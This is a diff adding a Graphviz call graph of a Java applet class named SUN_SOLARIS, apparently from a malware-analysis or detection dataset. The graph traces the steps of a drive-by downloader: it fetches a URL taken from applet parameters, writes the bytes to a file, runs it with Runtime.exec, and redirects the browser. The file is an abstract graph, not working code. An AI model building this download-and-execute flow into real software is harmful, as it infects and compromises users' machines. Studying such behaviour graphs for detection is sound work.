@@ -1,0 +1,26 @@
+digraph "" {
+"staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>";
+ "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"->"virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>";
+ "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"->"virtualinvoke <SUN_SOLARIS: java.lang.String getParameter(java.lang.String)>";
+ "virtualinvoke <SUN_SOLARIS: java.lang.String getParameter(java.lang.String)>"->"new java.io.FileOutputStream";
+ "new java.io.FileOutputStream"->"specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>";
+ "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+ "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.net.URL";
+ "new java.net.URL"->"virtualinvoke <SUN_SOLARIS: java.lang.String getParameter(java.lang.String)>";
+ "virtualinvoke <SUN_SOLARIS: java.lang.String getParameter(java.lang.String)>"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+ "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>";
+ "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"->"virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>";
+ "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"->"virtualinvoke <java.io.InputStream: int read(byte[],int,int)>";
+ "virtualinvoke <java.io.InputStream: int read(byte[],int,int)>"->"virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>";
+ "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"->"goto load.r r8";
+ "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"->"return";
+"virtualinvoke <java.io.InputStream: void close()>";
+ "virtualinvoke <java.io.InputStream: void close()>"->"virtualinvoke <java.io.FileOutputStream: void close()>";
+ "virtualinvoke <java.io.FileOutputStream: void close()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+ "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"new java.net.URL";
+ "new java.net.URL"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+ "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <SUN_SOLARIS: java.applet.AppletContext getAppletContext()>";
+ "virtualinvoke <SUN_SOLARIS: java.applet.AppletContext getAppletContext()>"->"interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1";
+ "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"->"goto return";
+ "goto return"->"return";
+}
